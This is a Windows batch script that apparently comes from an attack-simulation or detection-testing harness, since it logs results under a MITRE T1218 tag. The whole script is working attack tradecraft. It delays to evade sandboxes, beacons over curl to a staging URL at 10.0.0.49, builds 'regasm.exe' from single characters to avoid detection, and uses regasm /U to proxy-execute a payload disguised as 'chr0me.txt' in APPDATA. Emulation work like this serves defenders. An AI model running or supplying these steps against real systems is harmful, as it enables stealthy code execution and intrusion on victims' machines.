@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
SET fva=regasm.exe
SET txisnba=%APPDATA%\8608\b7a81aa2
SET mdvfmsbx=https://10.0.0.49
SET keghkgto=https://10.0.0.49/stage/2/icon.png?8608-7
SET jwcnifl=ITZEL-S2BO
SET rrocubc=7
SET xzanpex=chr0me.txt
SET dvhhyc=8608
SET log=%APPDATA%\!rrocubc!\macula-simulations.log
SET ts=0
SET ed=
REM Initial sandbox evasion delay
ping -n 45 127.0.0.1 >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: heartbeat_start>> "!log!" 2>nul
curl -k -s -o nul "!keghkgto!"
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: heartbeat_complete>> "!log!" 2>nul
timeout /t 10 /nobreak >nul
SET c1=r
SET c2=e
SET c3=g
SET c4=a
SET c5=s
SET c6=m
SET lolbin=!c1!!c2!!c3!!c4!!c5!!c6!.exe
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: chdir_start>> "!log!" 2>nul
cd /d "!txisnba!"
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: chdir_complete>> "!log!" 2>nul
CHOICE /C Y /N /D Y /T 8 >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: exec_start>> "!log!" 2>nul
!lolbin! /U "!xzanpex!"
IF !ERRORLEVEL! EQU 0 (
 SET ts=1
 SET ed=
) ELSE (
 SET ts=0
 SET ed=error!ERRORLEVEL!
)
echo [!DATE! !TIME!][!jwcnifl!]: !rrocubc!-!dvhhyc!-T1218|Signed_Binary_Proxy_Execution=!ts!:!ed!>> "!log!" 2>nul
SET /A dly=%RANDOM% %% 20 + 10
timeout /t !dly! /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: script_complete>> "!log!" 2>nul